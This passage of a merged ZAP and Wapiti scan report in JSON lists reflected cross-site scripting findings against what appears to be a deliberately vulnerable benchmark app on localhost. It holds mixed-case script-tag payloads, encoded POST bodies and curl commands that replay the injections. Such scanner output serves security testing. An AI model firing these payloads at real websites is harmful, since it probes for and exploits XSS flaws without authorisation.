attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00643"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00643', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00643.html?BenchmarkTest00643=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwNjQzPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00643', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00643.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00643=%3CScRiPt%3Ealert%28%27wz5388erhs%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:53 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:23:39 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wz5388erhs')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00645",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00645?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00645=%3CScRiPt%3Ealert%28%27wid2sjnevz%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wid2sjnevz')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wid2sjnevz')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00645\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00645.html?BenchmarkTest00645=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00645=%3CScRiPt%3Ealert%28%27wid2sjnevz%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00645"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00645', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00645.html?BenchmarkTest00645=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDA2NDU9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00645', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00645.html?BenchmarkTest00645=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00645=%3CScRiPt%3Ealert%28%27wid2sjnevz%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:23:39 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wid2sjnevz')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00651",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00651?secure=default&productID=default&foo=foo&BenchmarkTest00651=%3CScRiPt%3Ealert%28%27w2mc3wrexh%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w2mc3wrexh')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w2mc3wrexh')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00651\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00651.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest00651=%3CScRiPt%3Ealert%28%27w2mc3wrexh%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00651"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00651', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00651.html?BenchmarkTest00651=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAwNjUxPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00651', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00651.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest00651=%3CScRiPt%3Ealert%28%27w2mc3wrexh%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:23:53 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w2mc3wrexh')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00656",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00656?secure=default&productID=default&foo=foo&BenchmarkTest00656=%3CScRiPt%3Ealert%28%27w49su8kj7x%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w49su8kj7x')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w49su8kj7x')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00656\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00656.html?BenchmarkTest00656=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest00656=%3CScRiPt%3Ealert%28%27w49su8kj7x%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00656"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00656', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00656.html?BenchmarkTest00656=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAwNjU2PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00656', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00656.html?BenchmarkTest00656=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest00656=%3CScRiPt%3Ealert%28%27w49su8kj7x%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:23:53 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('w49su8kj7x')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00711",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00711?secure=default&productID=default&foo=foo&BenchmarkTest00711=%3CScRiPt%3Ealert%28%27wbbg9aed01%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 4",
                    "Wapiti - 4"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                      "Wapiti - <ScRiPt>alert('wbbg9aed01')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                  "Wapiti - <ScRiPt>alert('wbbg9aed01')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00711\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00711.html?BenchmarkTest00711=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest00711=%3CScRiPt%3Ealert%28%27wbbg9aed01%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00711"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00711', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '111', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00711.html?BenchmarkTest00711=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAwNzExPSUzQyUyRnAlM0UlM0NzY3JJcHQlM0VhbGVydCUyODElMjklM0IlM0MlMkZzY1JpcHQlM0UlM0NwJTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00711', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00711.html?BenchmarkTest00711=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest00711=%3CScRiPt%3Ealert%28%27wbbg9aed01%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '110', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and </p><scrIpt>alert(1);</scRipt><p>.\\n</p>\\n</body>\\n</html>'}, 'noResponseReceived': False}",
